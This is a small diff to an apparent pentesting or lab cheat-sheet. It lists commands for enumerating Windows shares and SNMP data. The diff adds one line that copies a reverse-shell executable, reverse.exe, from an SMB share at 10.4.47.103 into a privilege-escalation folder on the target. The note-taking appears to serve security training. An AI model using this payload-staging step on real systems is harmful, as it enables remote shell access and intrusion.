@@ -15,4 +15,5 @@
     - list shares : net share
 - snmp :
     - snmp logs : /opt/snmpcheck/snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
-    
+
+copy \\10.4.47.103\share\reverse.exe C:\PrivEsc\reverse.exe
